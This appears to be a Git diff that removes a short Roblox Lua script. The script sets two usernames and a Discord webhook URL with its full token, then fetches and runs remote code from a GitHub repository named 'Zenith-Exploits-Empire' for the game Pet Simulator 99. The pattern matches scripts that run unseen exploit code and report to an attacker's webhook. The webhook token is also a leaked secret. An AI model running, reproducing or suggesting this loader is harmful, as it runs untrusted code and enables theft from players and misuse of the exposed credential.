@@ -1,5 +1,0 @@
-Username = "zenith_build123"
-Username2 = "zenith_build123"
-Webhook = "https://discord.com/api/webhooks/1360601499788640500/jfwXAVk8dYUDmR_VlhBl92TOgY8VZ8jy9ez7yuwvHX3YpyaxxWUA1P7c4cUHcNFQJLVi"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
